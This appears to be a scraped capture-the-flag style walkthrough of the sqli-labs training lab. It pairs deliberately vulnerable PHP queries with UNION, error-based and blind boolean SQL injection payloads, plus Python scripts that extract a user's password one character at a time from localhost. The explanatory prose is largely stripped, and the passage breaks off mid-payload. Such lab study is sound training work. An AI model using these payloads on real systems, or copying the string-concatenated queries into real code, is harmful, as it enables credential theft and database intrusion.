test<span class="token punctuation">(</span><span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),1,1)='s') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),2,1)='e') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
test<span class="token punctuation">(</span><span class="token string">"?sort=x' OR rand(999) &lt; rand(substr(database(),3,1)='c') -- "</span><span class="token punctuation">)</span>  <span class="token comment"># True</span>
2d:T44f,<span class="token variable">$sort</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users ORDER BY <span class="token interpolation"><span class="token variable">$sort</span></span>"</span><span class="token punctuation">;</span> <span class="token comment">// BY '$sort'"</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ...</span>
5:[["$","h2",null,{"className":"x-h1","children":""}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<a href=\"https://github.com/Audi-1/sqli-labs\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/Audi-1/sqli-labs</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<a href=\"https://blog.csdn.net/dreamthe/article/details/123795302\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">sqli-labs1-65</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<a href=\"https://www.cnblogs.com/lcamry/category/846064.html\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">MySQL</a>"}}]}]]}],["$","h2",null,{"className":"x-h1","children":""}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"SQLLabLab"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">query_get</code><code class=\"x-inline-highlight\">query_post</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nbase_url = \"http://localhost/sqli-labs/\"\n\n\ndef query_get(path, payload, **kwargs):\n    url = base_url + f\"{path}/{payload}\"\n    resp = requests.get(url, **kwargs)\n    return resp\n\n\ndef query_post(path, **kwargs):\n    url = base_url + f\"{path}/\"\n    resp = requests.post(url, **kwargs)\n    return resp\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$f"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"L1-L4"}],["$","h3",null,{"className":"x-h2","children":" & "}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"LabSQLLab"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT group_concat(schema_name) FROM information_schema.schemata"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> group_concat<span class=\"token punctuation\">(</span>schema_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span>schemata"}}]}]]}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">security</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">WHERE</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'security'</span>"}}]}]]}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">security.users</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'security'</span> <span class=\"token operator\">AND</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'users'</span>"}}]}]]}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">security.users</code><code class=\"x-inline-highlight\">username</code><code class=\"x-inline-highlight\">password</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT group_concat(username),group_concat(password) FROM security.users"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> security<span class=\"token punctuation\">.</span>users"}}]}]]}]]}]]}],["$","h3",null,{"className":"x-h2","children":"L1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$id = $_GET['id'];\n$sql = \"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE id='<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' LIMIT 0,1\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \"</span>"}}]}]]}],["$","$L10",null,{"src":"L1.jpg","width":"100%"}],["$","h3",null,{"className":"x-h2","children":"L2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$id = $_GET['id'];\n$sql = \"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE id=<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span> LIMIT 0,1\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \"</span>"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L3"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$id = $_GET['id'];\n$sql = \"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE id=('<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>') LIMIT 0,1\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \""}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \"</span>"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L4"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$id = $_GET['id'];\n$id = '\"' . $id . '\"';\n$sql = \"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$id</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE id=(<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>) LIMIT 0,1\"</span><span class=\"token punctuation\">;</span>\n"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = '?id=x\") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">'?id=x\") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '</span>"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"L5-L10"}],["$","h3",null,{"className":"x-h2","children":" & "}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"SQL"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"Lab<code class=\"x-inline-highlight\">Angelina</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT password FROM security.users WHERE username='Angelina'"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> password <span class=\"token keyword\">FROM</span> security<span class=\"token punctuation\">.</span>users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'Angelina'</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">I-kill-you</code>"}}],["$","h4",null,{"className":"x-h3","children":""}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"//Lab/"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"MySQL"}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">substr(str, pos, len)</code><code class=\"x-inline-highlight\">str</code><code class=\"x-inline-highlight\">pos</code><code class=\"x-inline-highlight\">len</code><code class=\"x-inline-highlight\">pos</code>1"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT substr(\"abcdef\",1,3);          -- abc\nSELECT substr((SELECT \"123456\"),4,3); -- 456\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> substr<span class=\"token punctuation\">(</span><span class=\"token string\">\"abcdef\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          <span class=\"token comment\">-- abc</span>\n<span class=\"token keyword\">SELECT</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">-- 456</span>\n"}}]}]]}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">ascii(ch)</code><code class=\"x-inline-highlight\">ch</code>ASCII<code class=\"x-inline-highlight\">ch</code>ASCII"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT ascii(\"A\");   -- 65\nSELECT ascii(\"abc\"); -- 97\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> ascii<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">-- 65</span>\n<span class=\"token keyword\">SELECT</span> ascii<span class=\"token punctuation\">(</span><span class=\"token string\">\"abc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">-- 97</span>\n"}}]}]]}]]}]]}],["$","h4",null,{"className":"x-h3","children":""}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"MySQL"}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">sleep(sec)</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT sleep(3);"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>"}}]}]]}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">if(cond, exp_true, exp_false)</code><code class=\"x-inline-highlight\">cond</code><code class=\"x-inline-highlight\">exp_true</code><code class=\"x-inline-highlight\">exp_false</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT if(1+1=2,\"Yes\",\"No\"); -- Yes\nSELECT if(11>45,sleep(1),4); -- 4\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$11"}}]}]]}]]}]]}],["$","div",null,{"className":"x-highlightblock highlight-background-golden","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">sleep(...)</code><code class=\"x-inline-highlight\">sleep</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"SELECT id FROM users WHERE sleep(1);"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">SELECT</span> id <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>"}}]}]]}]]}],["$","h4",null,{"className":"x-h3","children":""}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":" ^v^"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"MySQL"}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">extractvalue(xml_string, xpath)</code>XML<code class=\"x-inline-highlight\">xpath</code><code class=\"x-inline-highlight\">xpath</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"extractvalue(null,concat(0x7e,(SELECT 'anything'),0x7e))"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'anything'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">~</code><code class=\"x-inline-highlight\">0x7e</code>Xpath"}}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">updatexml(xml_string, xpath, new_xml)</code>"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"SQL"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"updatexml(null,concat(0x7e,(SELECT 'anything'),0x7e),null)"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"updatexml<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'anything'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">)</span>"}}]}]]}]]}]]}],["$","h3",null,{"className":"x-h2","children":"L5"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L5"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"from query import *\n\n# target: SELECT password FROM security.users WHERE username='Angelina'\n\nprint(len(query_get(\"Less-5\", \"?id=1' AND 1=0 -- \").text))  # 720\nprint(len(query_get(\"Less-5\", \"?id=1' AND 1=1 -- \").text))  # 704\n\n\ndef brute_force(pos):\n    for i in range(32, 127):\n        payload = f\"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- \"\n        resp = query_get(\"Less-5\", payload)\n        if len(resp.text) == 704:\n            return i\n    return None\n\n\npassword = \"\"\nwhile True:\n    ch = brute_force(len(password) + 1)\n    if ch is None:\n        break\n    print(\"[*] found\", chr(ch))\n    password += chr(ch)\n\nprint(password)  # I-kill-you\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 168px, transparent 168px, transparent 264px, var(--bg-transparent-golden) 264px 360px, transparent 360px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$12"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L6"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":""}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"print(len(query_get(\"Less-6\", '?id=1\" AND 1=0 -- ').text))  # 720\nprint(len(query_get(\"Less-6\", '?id=1\" AND 1=1 -- ').text))  # 702\n\n\ndef brute_force(pos):\n    for i in range(32, 127):\n        payload = f'?id=1\" AND ascii(substr((SELECT password FROM security.users WHERE username=\"Angelina\"),{pos},1))={i} -- '\n        resp = query_get(\"Less-6\", payload)\n        if len(resp.text) == 702:\n            return i\n    return None\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$13"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L7"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"L7"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<font color= \"#FFFF00\">You have an error in your SQL syntax</font></font> </div></br></br></br><center>\n<font color= \"#FFFF00\">You are in.... Use outfile......<br></font></font> </div></br></br></br><center>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$14"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"print(\"You are in\" in query_get(\"Less-7\", \"?id=1')) AND 1=0 -- \").text)  # False\nprint(\"You are in\" in query_get(\"Less-7\", \"?id=1')) AND 1=1 -- \").text)  # True\n\n\ndef brute_force(pos):\n    for i in range(32, 127):\n        payload = f\"?id=1')) AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- \"\n        resp = query_get(\"Less-7\", payload)\n        if \"You are in\" in resp.text:\n            return i\n    return None\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$15"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L8"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"print(len(query_get(\"Less-8\", \"?id=1' AND 1=0 -- \").text))  # 722\nprint(len(query_get(\"Less-8\", \"?id=1' AND 1=1 -- \").text))  # 706\n\n\ndef brute_force(pos):\n    for i in range(32, 127):\n        payload = f\"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- \"\n        resp = query_get(\"Less-8\", payload)\n        if len(resp.text) == 706:\n            return i\n    return None\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$16"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"L9"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"print(len(query_get(\"Less-9\", \"?id=1' AND 1=0 -- \").text))  # 744\nprint(len(query_get(\"Less-9\", \"?id=1' AND 1=1 -- \").text))  # 707\n\n\ndef brute_force(pos):\n    for i in range(32, 127):\n        payload = f\"?id=1' 